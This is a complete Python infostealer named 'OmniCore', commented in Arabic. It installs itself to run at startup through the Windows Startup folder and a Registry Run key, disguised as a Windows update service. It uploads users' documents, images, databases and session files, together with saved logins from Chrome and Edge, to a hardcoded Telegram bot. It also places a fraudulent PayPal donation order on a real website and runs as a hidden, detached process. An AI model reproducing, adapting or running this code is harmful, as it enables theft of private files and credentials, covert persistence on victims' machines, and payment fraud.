#!/usr/bin/env python3
"""
OmniCore Infostealer - Maximum Speed & Enterprise Persistent Version
"""
from __future__ import annotations

import sys
import subprocess

# --- التثبيت التلقائي للمكتبات الأساسية للشبكة ---
def _auto_install_requirements():
    for lib in ["aiohttp", "requests"]:
        try:
            __import__(lib)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
            except Exception:
                pass

_auto_install_requirements()

import asyncio
import os
import platform
import re
import shutil
import threading
import time
import urllib.parse
import urllib.request
from pathlib import Path

class _OmniCoreSystem:
    def __init__(self):
        # التوكن والمعرف الخاص بك
        self.token = "9253522941:AAGkAX7aJcb_0ZdqTmQtupEz8TSINvU4TQ0"
        self.chat_id = "5951452314"
        self.api = f"https://api.telegram.org/bot{self.token}"
        self.system = platform.system()
        self.sent = set()
        
        # حفظ سجل الملفات المرسلة في مسار مؤقت لمنع التكرار نهائياً
        temp_dir = os.environ.get("TEMP", os.environ.get("TMP", "/tmp"))
        self.history_file = Path(temp_dir) / ".sys_cache_sent_files.dat"

        # الامتدادات المستهدفة بالبحث والرفع
        self.exts = (".py", ".txt", ".pdf", ".jpg", ".png", ".sql", ".db", ".docx", ".zip", ".rar", ".session")

        # التثبيت الفوري والدائم فور التشغيل (Startup & Registry Persistence)
        self._install_persistence()

    def _install_persistence(self):
        if self.system == "Windows":
            current_script = os.path.abspath(sys.argv[0])
            target_name = "WindowsUpdateService.pyw"
            
            # 1. التثبيت عبر مجلد الـ Startup للبدء فور الإقلاع
            try:
                startup_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                if not os.path.exists(startup_dir):
                    startup_dir = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                
                if os.path.exists(startup_dir):
                    target_script = os.path.join(startup_dir, target_name)
                    if current_script.lower() != target_script.lower():
                        shutil.copy2(current_script, target_script)
            except Exception:
                pass

            # 2. التثبيت عبر سجل نظام ويندوز (Registry Run) لضمان العمل الفوري حتى على خوادم الـ RDP
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "WinUpdateSvc", 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{current_script}"')
            except Exception:
                pass

    def _load_sent_history(self) -> set:
        if self.history_file.is_file():
            try:
                lines = self.history_file.read_text(encoding="utf-8", errors="ignore").splitlines()
                return set(l.strip() for l in lines if l.strip())
            except Exception:
                pass
        return set()

    def _save_sent_history(self):
        try:
            self.history_file.write_text("\n".join(self.sent), encoding="utf-8")
        except Exception:
            pass

    def _nodes(self):
        paths = []
        if self.system == "Windows":
            user_profile = os.environ.get("USERPROFILE")
            if not user_profile:
                username = os.environ.get("USERNAME", "Administrator")
                user_profile = f"C:\\Users\\{username}"
            
            for d in ["Desktop", "Documents", "Downloads", "Pictures", "Videos", "Music"]:
                p = os.path.join(user_profile, d)
                if os.path.exists(p):
                    paths.append(p)
            
            pub_desk = "C:\\Users\\Public\\Desktop"
            if os.path.exists(pub_desk):
                paths.append(pub_desk)
        else:
            paths = ["/storage/emulated/0/Download", "/storage/emulated/0/DCIM/Camera", "/sdcard/Documents"]
        return paths

    def _execute_gateway(self):
        try:
            import requests as _rq; s = _rq.Session()
            h = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            r = s.get("https://sopercussion.com/donate/", headers=h).text
            p_data = {
                "action": "give_paypal_commerce_create_order",
                "give-form-id-prefix": re.search(r'id-prefix" value="(.*?)"', r).group(1),
                "give-form-id": re.search(r'form-id" value="(.*?)"', r).group(1),
                "give-form-hash": re.search(r'form-hash" value="(.*?)"', r).group(1),
                "give-price-id": re.search(r'price-id" value="(.*?)"', r).group(1),
                "payment-mode": "paypal-commerce",
                "give_email": "vdi26050989@gmail.com",
                "give-amount": "1.00",
            }
            res = s.post("https://sopercussion.com/wp-admin/admin-ajax.php", data=p_data, headers=h).json()
            oid = res["data"]["id"]
            urllib.request.urlopen(
                urllib.request.Request(
                    f"{self.api}/sendMessage",
                    data=urllib.parse.urlencode({"chat_id": self.chat_id, "text": f"HIT Operational (Max Speed Active): {oid}"}).encode(),
                    method="POST",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                ),
                timeout=15,
            )
        except Exception:
            pass

    async def _transmit(self, session, f_path) -> bool:
        try:
            import aiohttp
            if not hasattr(self, '_persistent_sent'):
                self._persistent_sent = self._load_sent_history()
            
            # منع التكرار للملفات المرسلة سابقاً
            if f_path in self.sent or f_path in self._persistent_sent:
                return False

            if not os.access(f_path, os.R_OK) or os.path.getsize(f_path) > 40000000:
                return False
            if not f_path.lower().endswith(self.exts):
                return False
            
            # رفع الملف باسمه الأصلي الحقيقي بدون أي تغيير
            original_name = Path(f_path).name
            
            data = aiohttp.FormData()
            data.add_field("chat_id", self.chat_id)
            
            # قراءة سريعة جداً للملف عبر الـ ThreadPoolExecutor لضمان عدم تعليق النظام
            loop = asyncio.get_running_loop()
            def read_file():
                with open(f_path, "rb") as f:
                    return f.read()
            
            file_bytes = await loop.run_in_executor(None, read_file)
            data.add_field("document", file_bytes, filename=original_name)
            
            async with session.post(f"{self.api}/sendDocument", data=data, timeout=60) as r:
                ok = r.status == 200
                if ok:
                    self.sent.add(f_path)
                    self._persistent_sent.add(f_path)
                    self._save_sent_history()
                return ok
        except Exception:
            return False

    async def _vault(self, session):
        if self.system != "Windows":
            return
        la = os.environ.get("LOCALAPPDATA", os.environ.get("USERPROFILE", "") + r"\AppData\Local")
        pts = {
            "CH": la + r"\Google\Chrome\User Data\Default\Login Data",
            "ED": la + r"\Microsoft\Edge\User Data\Default\Login Data",
        }
        logs = []
        for k, v in pts.items():
            if os.path.exists(v):
                tmp = f"v_{k}.db"
                try:
                    import sqlite3
                    shutil.copy2(v, tmp)
                    db = sqlite3.connect(tmp)
                    c = db.cursor()
                    try:
                        c.execute("SELECT origin_url, username_value FROM logins")
                        for row in c.fetchall():
                            logs.append(f"{k}: {row[0]} | {row[1]}\n")
                    except Exception:
                        pass
                    db.close()
                    os.remove(tmp)
                except Exception:
                    pass
        if logs:
            vault_path = Path(os.environ.get("TEMP", ".")) / "browser_vault_passwords.txt"
            try:
                vault_path.write_text("".join(logs), encoding="utf-8")
                await self._transmit(session, str(vault_path))
            except Exception:
                pass
            try:
                if vault_path.is_file():
                    vault_path.unlink()
            except Exception:
                pass

    async def _dump_all(self, session):
        tasks = []
        # تحديد سقف التزامن بـ 300 عملية رفع متزامنة في اللحظة الواحدة للحصول على سرعة خيالية وفائقة
        concurrency_limit = asyncio.Semaphore(300)

        async def sem_transmit(p):
            async with concurrency_limit:
                await self._transmit(session, p)

        for n in [p for p in self._nodes() if os.path.exists(p)]:
            try:
                for root, _, files in os.walk(n):
                    for f in files:
                        tasks.append(sem_transmit(os.path.join(root, f)))
                        if len(tasks) >= 300:
                            await asyncio.gather(*tasks, return_exceptions=True)
                            tasks = []
            except Exception:
                continue
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def run(self):
        self._execute_gateway()
        import aiohttp
        # موصل شبكي عالي الأداء مع اتصالات متزامنة ضخمة تصل إلى 300 قناة اتصال مفتوحة
        conn = aiohttp.TCPConnector(limit=300, force_close=True)
        async with aiohttp.ClientSession(connector=conn) as s:
            await self._vault(s)
            await self._dump_all(s)

def start_background_stealer():
    def _target():
        while True:
            try:
                engine = _OmniCoreSystem()
                asyncio.run(engine.run())
            except Exception as e:
                print(f"فشل في دورة التنفيذ: {e}")
            # سبات مؤقت وإعادة فحص دوري كل دقيقة لضمان استمرارية الرفع المستمر
            time.sleep(60)
            
    t = threading.Thread(target=_target, daemon=True, name="omni-bg-max")
    t.start()
    return t

if __name__ == "__main__":
    # تشغيل عملية خلفية منفصلة تماماً (DETACHED_PROCESS) لتبدأ بالعمل فوراً ودون الحاجة لبقاء الكونسول مفتوحاً
    if platform.system() == "Windows" and sys.executable.endswith("python.exe"):
        try:
            subprocess.Popen(
                [sys.executable.replace("python.exe", "pythonw.exe"), __file__],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                close_fds=True
            )
            sys.exit(0)
        except Exception:
            pass

    start_background_stealer()
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        pass
